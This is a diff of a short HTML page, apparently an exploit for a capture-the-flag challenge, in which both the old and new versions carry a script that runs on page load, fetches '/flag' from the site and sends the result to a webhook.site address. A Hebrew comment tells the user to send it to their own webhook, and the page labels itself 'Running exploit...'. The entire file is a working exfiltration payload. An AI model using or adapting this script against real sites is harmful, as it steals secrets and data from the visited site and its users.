@@ -1,17 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head><title>Flag Finder</title></head>
-<body>
-  <h1>Scanning for Flag...</h1>
-  <script>
-  fetch('/flag')
-    .then(r => r.text())
-    .then(flag => {
-      // שליחה ל־webhook שלך
-      fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?flag=' + encodeURIComponent(flag));
-    });
-</script>
-
-</body>
+  <body>
+    <script>
+      fetch("/flag")
+        .then(r => r.text())
+        .then(data => {
+          fetch("https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?flag=" + encodeURIComponent(data));
+        });
+    </script>
+    <p style="color:red">Running exploit...</p>
+  </body>
 </html>
-
